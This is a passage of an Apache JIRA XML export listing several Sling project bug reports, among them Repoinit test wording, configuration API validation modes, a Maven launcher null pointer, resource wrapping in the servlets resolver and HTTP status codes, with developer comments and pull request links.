                <updated>Mon, 11 Jul 2022 18:52:41 +0000</updated>
                            <resolved>Mon, 13 Jun 2022 14:48:12 +0000</resolved>
                                                    <fixVersion>Repoinit Parser 1.7.0</fixVersion>
                                    <component>Repoinit</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="5400">1.5h</timespent>
                                <comments>
                            <comment id="17551527" author="anchela" created="Wed, 8 Jun 2022 10:11:09 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=bdelacretaz&quot; class=&quot;user-hover&quot; rel=&quot;bdelacretaz&quot;&gt;bdelacretaz&lt;/a&gt;, this issues surfaced during a customer escalation. would you have time to take a look and fix it? (and yes: sling:redirect is not a valid primary type... but that&apos;s a different story and should not matter because afaik jcr-repoinit will not validate the primary type information if the node already exists).&lt;/p&gt;</comment>
                            <comment id="17553624" author="rombert" created="Mon, 13 Jun 2022 14:48:12 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Sc0rpic0m&quot; class=&quot;user-hover&quot; rel=&quot;Sc0rpic0m&quot;&gt;Sc0rpic0m&lt;/a&gt; &apos;s PR was merged - &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-repoinit-parser/pull/20&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-repoinit-parser/pull/20&lt;/a&gt; .&lt;/p&gt;</comment>
                            <comment id="17554023" author="anchela" created="Tue, 14 Jun 2022 10:05:36 +0000"  >&lt;p&gt;hi &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Sc0rpic0m&quot; class=&quot;user-hover&quot; rel=&quot;Sc0rpic0m&quot;&gt;Sc0rpic0m&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt;, would it be possible to adjust the test case a bit as it is quite confusing.&lt;/p&gt;

&lt;ul class=&quot;alternate&quot; type=&quot;square&quot;&gt;
	&lt;li&gt;repoinit &quot;create path xyz&quot; &lt;em&gt;does not&lt;/em&gt; allow you to set the sling:resourceType property as was implied by the original summary&lt;/li&gt;
	&lt;li&gt;sling:resourceType property would need to be modified through &apos;set properties&apos;&lt;/li&gt;
	&lt;li&gt;afaik &lt;em&gt;sling:redirect&lt;/em&gt; is not a valid primary type but rather a resource type and an attempt to use it in create path will fail with NoSuchNodeTypeException&lt;/li&gt;
	&lt;li&gt;since repoinit tests are used to generate the documentation i would prefer if there no misleading examples in there.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;wdyt?&lt;/p&gt;</comment>
                            <comment id="17555067" author="rombert" created="Thu, 16 Jun 2022 12:52:32 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Sc0rpic0m&quot; class=&quot;user-hover&quot; rel=&quot;Sc0rpic0m&quot;&gt;Sc0rpic0m&lt;/a&gt; - thoughts on Angela&apos;s comment?&lt;/p&gt;</comment>
                            <comment id="17555506" author="sc0rpic0m" created="Fri, 17 Jun 2022 09:30:29 +0000"  >&lt;p&gt;HI &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=angela&quot; class=&quot;user-hover&quot; rel=&quot;angela&quot;&gt;angela&lt;/a&gt; ,I was not aware repo-init tests were used to generate docs. You are right, in this case il adjust the test to something that is truthful as use a primaryType instead of a resourceType.&#160;&lt;/p&gt;</comment>
                            <comment id="17555622" author="sc0rpic0m" created="Fri, 17 Jun 2022 13:45:45 +0000"  >&lt;p&gt;PR: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-repoinit-parser/pull/21&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-repoinit-parser/pull/21&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;CC &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=angela&quot; class=&quot;user-hover&quot; rel=&quot;angela&quot;&gt;angela&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt;&#160;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 18 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z131s0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11383] Configuration API validation fails for internal names with LENIENT mode</title>
                <link>https://issues.apache.org/jira/browse/SLING-11383</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Consider the following configuration-api&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
  &lt;span class=&quot;code-quote&quot;&gt;&quot;configuration-api:JSON&quot;&lt;/span&gt;: {
    &lt;span class=&quot;code-quote&quot;&gt;&quot;factory-configurations&quot;&lt;/span&gt;: {
      &lt;span class=&quot;code-quote&quot;&gt;&quot;my.service.pid&quot;&lt;/span&gt;: {
        &lt;span class=&quot;code-quote&quot;&gt;&quot;mode&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;LENIENT&quot;&lt;/span&gt;,
        &lt;span class=&quot;code-quote&quot;&gt;&quot;region&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;GLOBAL&quot;&lt;/span&gt;,
        &lt;span class=&quot;code-quote&quot;&gt;&quot;internal-names&quot;&lt;/span&gt;: [
          &lt;span class=&quot;code-quote&quot;&gt;&quot;&lt;span class=&quot;code-keyword&quot;&gt;default&lt;/span&gt;&quot;&lt;/span&gt;
        ]
    }
  }
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As a user I would expect to get a warning when I have a configuration &lt;tt&gt;my.service.pid~default&lt;/tt&gt; in my project, but the actual result is an error.&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
Configuration my.service.pid~&lt;span class=&quot;code-keyword&quot;&gt;default&lt;/span&gt;: Factory configuration with name is not allowed
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The reason for that is that the &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-extension-apiregions/blob/org.apache.sling.feature.extension.apiregions-1.6.0/src/main/java/org/apache/sling/feature/extension/apiregions/api/config/validation/FeatureValidator.java#L156&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;FeatureValidator&lt;/a&gt; does not use the configuration description&apos;s validation mode but the one of the ConfigurationApi.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13448940">SLING-11383</key>
            <summary>Configuration API validation fails for internal names with LENIENT mode</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="diru">Dirk Rudolph</assignee>
                                    <reporter username="diru">Dirk Rudolph</reporter>
                        <labels>
                    </labels>
                <created>Wed, 8 Jun 2022 07:50:53 +0000</created>
                <updated>Mon, 11 Jul 2022 05:13:58 +0000</updated>
                            <resolved>Wed, 8 Jun 2022 11:56:13 +0000</resolved>
                                    <version>Feature Model API Regions Extension 1.6.0</version>
                                    <fixVersion>Feature Model API Regions Extension 1.6.2</fixVersion>
                                    <component>Feature Model Analyser</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17551514" author="cziegeler" created="Wed, 8 Jun 2022 09:47:47 +0000"  >&lt;p&gt;I think we need a complete test case here. Keep in mind that this heavily depends on the region of the feature which contains the configuration. &lt;/p&gt;</comment>
                            <comment id="17551517" author="diru" created="Wed, 8 Jun 2022 10:02:51 +0000"  >&lt;p&gt;Wouldn&apos;t it be as simple as taking the validation mode from the FactoryConfigurationDescription and if not set falling back to the one defined for the ConfigurationApi? This would be the same pattern that I see in the &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-extension-apiregions/blob/4f871d436dd3f8b500f0f690342d8e3b7e7c5897/src/main/java/org/apache/sling/feature/extension/apiregions/api/config/validation/ConfigurationValidator.java#L103&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ConfigurationValidator&lt;/a&gt;, or am I missing something here?&lt;/p&gt;</comment>
                            <comment id="17551518" author="cziegeler" created="Wed, 8 Jun 2022 10:05:39 +0000"  >&lt;p&gt;Maybe, I thought the impl already does it and we have covered this per unit tests.&lt;br/&gt;
But yes, now I see what you mean. I assume that applies to most checks done in that area.&lt;br/&gt;
Still, we should cover it with tests as apparently it isn&apos;t yet&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 20 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z131ko:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11378] Execution fails if no launcher arguments are defined</title>
                <link>https://issues.apache.org/jira/browse/SLING-11378</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;blockquote&gt;&lt;p&gt;org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.sling:feature-launcher-maven-plugin:0.1.3-SNAPSHOT:start (default) on project bundle-version-override: Execution default of goal org.apache.sling:feature-launcher-maven-plugin:0.1.3-SNAPSHOT:start failed: Cannot invoke &quot;org.apache.sling.maven.feature.launcher.LauncherArguments.getVmOptions()&quot; because the return value of &quot;org.apache.sling.maven.feature.launcher.Launch.getLauncherArguments()&quot; is null&lt;/p&gt;&lt;/blockquote&gt;</description>
                <environment></environment>
        <key id="13448366">SLING-11378</key>
            <summary>Execution fails if no launcher arguments are defined</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 3 Jun 2022 16:39:13 +0000</created>
                <updated>Wed, 23 Nov 2022 03:38:26 +0000</updated>
                            <resolved>Fri, 1 Jul 2022 10:33:11 +0000</resolved>
                                                    <fixVersion>Feature Launcher Maven Plugin 0.1.4</fixVersion>
                                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 20 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12y14:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11373] The MergingServletResourceProvider does not wrap resources correctly</title>
                <link>https://issues.apache.org/jira/browse/SLING-11373</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The &lt;tt&gt;MergingServletResourceProvider&lt;/tt&gt; does not wrap resources correctly, forcing script engines that need to solve dependencies via this provider to call &lt;tt&gt;ResourceResolver#resolve(String)&lt;/tt&gt;. Unfortunately, there is a case when the call to &lt;tt&gt;resolve&lt;/tt&gt; fails:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;/apps/components/a/
    a.html
    helper.something.html
    helper/ [backed by JCR]
      partial.html
/apps/components/b [sling:resourceSuperType=components/a]
    b.html -&amp;gt; tries to resolve helper.something.html
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the case above, &lt;tt&gt;b.html&lt;/tt&gt; will get the &lt;tt&gt;helper&lt;/tt&gt; folder when trying to resolve &lt;tt&gt;helper.something.html&lt;/tt&gt;.&lt;/p&gt;

&lt;p&gt;If the &lt;tt&gt;MergingServletResourceProvider&lt;/tt&gt; would correctly wrap resources (and decorate them accordingly), the script engines could switch to using &lt;tt&gt;ResourceResolver#getResource(String)&lt;/tt&gt;, which would not exhibit the same behaviour.&lt;/p&gt;
</description>
                <environment></environment>
        <key id="13448275">SLING-11373</key>
            <summary>The MergingServletResourceProvider does not wrap resources correctly</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="pauls">Karl Pauls</assignee>
                                    <reporter username="radu">Radu Cotescu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 3 Jun 2022 07:35:15 +0000</created>
                <updated>Fri, 12 Aug 2022 11:18:18 +0000</updated>
                            <resolved>Thu, 14 Jul 2022 10:05:54 +0000</resolved>
                                    <version>Servlets Resolver 2.7.0</version>
                                    <fixVersion>Servlets Resolver 2.9.8</fixVersion>
                                    <component>Servlets</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>4</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="5400">1.5h</timespent>
                                <comments>
                            <comment id="17564922" author="cziegeler" created="Mon, 11 Jul 2022 10:44:54 +0000"  >&lt;p&gt;One option to implement this is by introducing a new mode for a resource provider as prototyped in&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/tree/feature/resource-provider-mode&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/tree/feature/resource-provider-mode&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17566744" author="karlpauls" created="Thu, 14 Jul 2022 10:05:47 +0000"  >&lt;p&gt;With the new passthrough mode from &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; (many thanks), it seems like the best option to just use that one. &lt;/p&gt;

&lt;p&gt;I added a &lt;tt&gt;mountPathProviders&lt;/tt&gt; option in &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt; which overrides the &lt;tt&gt;mountProviders&lt;/tt&gt; option if enabled. That should fix the issue the right way and we can eventually deprecated the &lt;tt&gt;mountProviders&lt;/tt&gt; option altogether. &lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-servlets-resolver/pull/30&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-servlets-resolver/pull/30&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13474843">SLING-11508</issuekey>
        </issuelink>
                            </outwardlinks>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13470997">SLING-11448</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 14 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12xgw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11371] Wrong 503-unavailable status code in Distribution API responses</title>
                <link>https://issues.apache.org/jira/browse/SLING-11371</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Sometimes we are answered with an HTTP &lt;b&gt;503-UNAVAILABLE&lt;/b&gt; status code when there are unexpected errors within the distribution system.&lt;/p&gt;

&lt;p&gt;This status code is misleading since the service is not unavailable, but had an unexpected exception. Maybe a more precise status code would be a &lt;b&gt;500&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;However, we need to make sure that we don&apos;t break current clients, so this change needs to be discussed.&lt;/p&gt;
&lt;h2&gt;&lt;a name=&quot;Cases&quot;&gt;&lt;/a&gt;Cases&lt;/h2&gt;
&lt;ol&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/servlet/DistributionAgentServlet.java#L74&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/servlet/DistributionAgentServlet.java#L74&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/servlet/DistributionPackageExporterServlet.java#L81&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/servlet/DistributionPackageExporterServlet.java#L81&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/servlet/DistributionPackageExporterServlet.java#L157&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/servlet/DistributionPackageExporterServlet.java#L157&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13448147">SLING-11371</key>
            <summary>Wrong 503-unavailable status code in Distribution API responses</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="jose-correia">Jos&#233; Correia</reporter>
                        <labels>
                    </labels>
                <created>Thu, 2 Jun 2022 13:50:02 +0000</created>
                <updated>Thu, 2 Jun 2022 13:50:02 +0000</updated>
                                                                            <component>Content Distribution</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
